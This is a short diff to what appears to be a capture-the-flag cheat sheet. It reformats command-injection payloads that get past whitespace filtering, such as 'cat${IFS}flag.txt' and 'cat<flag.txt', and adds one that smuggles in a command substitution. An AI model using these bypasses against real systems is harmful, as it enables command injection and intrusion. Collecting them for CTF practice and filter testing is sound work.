@@ -7,8 +7,11 @@
   `id`
   ```
 - Whitespace
-  - `cat${IFS}flag.txt`
-  - `cat<flag.txt`
+  ```
+  cat${IFS}flag.txt
+  cat$IFS$9`ls`
+  cat<flag.txt
+  ```
 
 ## Python jailbreak
 
